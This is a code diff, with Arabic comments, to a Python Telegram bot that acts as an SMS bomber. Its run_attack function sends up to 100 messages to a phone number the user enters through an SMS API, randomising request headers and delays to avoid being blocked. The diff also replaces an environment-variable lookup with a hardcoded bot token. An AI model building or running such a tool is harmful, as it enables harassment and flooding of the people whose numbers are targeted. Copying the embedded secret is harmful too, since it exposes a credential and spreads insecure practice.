@@ -3,7 +3,6 @@ import asyncio
 import random
 import string
 import httpx
-import os
 
 from telegram import Update
 from telegram.ext import (
@@ -15,13 +14,14 @@ from telegram.ext import (
     filters,
 )
 
-# الحصول على التوكن من متغير البيئة
-TOKEN = os.getenv("BOT_TOKEN")
+# لا تنس وضع التوكن الآمن والجديد هنا
+TOKEN = '8085909274:AAFHj_haKlG4ODD8X-Z1ARAl3OC0lFj0c3E'
 
 # إعدادات عامة
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
 )
+# -- تم التصحيح هنا --
 logger = logging.getLogger(__name__)
 
 GET_NUMBER, GET_COUNT = range(2)
@@ -68,10 +68,7 @@ async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     async with httpx.AsyncClient() as client:
         for i in range(sms_count):
-            payload = {
-                "dial": number,
-                "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=6))
-            }
+            payload = {"dial": number, "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=6))}
             headers = get_random_headers()
             try:
                 response = await client.post(API_URL, headers=headers, json=payload, timeout=20.0)
@@ -82,22 +79,24 @@ async def run_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except httpx.ConnectTimeout:
                 logger.error("Connection to SMS API timed out.")
                 failure_count += 1
-                await context.bot.send_message(chat_id, "❌ فشل الاتصال بسيرفر الرسائل (Timed Out). سأكمل المحاولة...")
+                await context.bot.send_message(chat_id, "❌ فشل الاتصال بسيرفر الرسائل (Timed Out). قد يكون السيرفر متوقفًا. سأكمل المحاولة...")
             except Exception as e:
-                logger.error(f"Unexpected error: {e}")
+                logger.error(f"An unexpected error occurred: {e}")
                 failure_count += 1
+            
             await asyncio.sleep(random.uniform(1.0, 2.5))
 
-    summary_text = f"📊 اكتملت العملية 📊\n- ✅ نجاح: {success_count}\n- ❌ فشل: {failure_count}"
+    summary_text = f"📊 **اكتملت العملية** 📊\n- ✅ نجاح: `{success_count}`\n- ❌ فشل: `{failure_count}`"
     await context.bot.send_message(chat_id, text=summary_text, parse_mode='Markdown')
 
 async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     try:
         sms_count = int(update.message.text)
         if not (1 <= sms_count <= 100):
+            # -- تم تصحيح المسافة البادئة هنا --
             await update.message.reply_text("❌ العدد غير مسموح به. أدخل رقمًا بين 1 و 100.")
             return GET_COUNT
-
+        
         context.user_data['sms_count'] = sms_count
         await run_attack(update, context)
         return ConversationHandler.END
@@ -108,10 +107,9 @@ async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text("👍 تم إلغاء العملية.")
     return ConversationHandler.END
-
+    
 def main() -> None:
     application = Application.builder().token(TOKEN).build()
-
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler("sms", start_sms_command)],
         states={
@@ -120,12 +118,11 @@ def main() -> None:
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
-
     application.add_handler(CommandHandler("start", start_command))
     application.add_handler(conv_handler)
-
     print("🚀 Bot is running...")
     application.run_polling()
 
+# -- تم التصحيح هنا --
 if __name__ == "__main__":
     main()
